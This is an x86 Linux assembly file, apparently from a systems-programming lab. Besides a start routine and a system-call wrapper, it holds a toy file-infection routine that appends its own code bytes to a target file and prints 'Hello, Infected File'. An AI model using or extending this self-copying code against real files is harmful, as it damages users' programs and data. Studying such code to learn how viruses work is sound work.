
section .data
msg: db "Hello, Infected File",0xA  ; string to print
len:  equ $ - msg   ;length of string
section .text
global _start
global system_call
global code_start
global code_end
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


s:
code_start:

    pushad
    mov eax,4   ;system call number (sys_write)            
    mov ebx,1   ;file descriptor (stdout)
    mov ecx, msg    ;message to write
    mov edx, len    ;message length   
    int 0x80    ;call kernel
    popad
    ret

code_end:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov eax, 5
    mov ebx, [ebp+8]
    mov ecx, 1 | 1024   ; write and append
    mov edx, 0x700
    int 0x80
    mov [ebp-4], eax

    mov ebx, [ebp-4]
    mov eax, 4
    mov ecx, s
    mov edx, e
    sub edx, s
    int 0x80

    mov eax, 6
    mov ebx, [ebp-4]
    int 0x80 

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

e:

;SYS_OPEN -> 5 args2: pathname  args3: O_APPEND -> 1024 
;SYS_WRITE -> 4 args2 -> File descriptor args3 -> pointer to output buffer args4 -> count of bytes to send
;SYS_CLOSE -> 6 args2 -> FIle descriptor
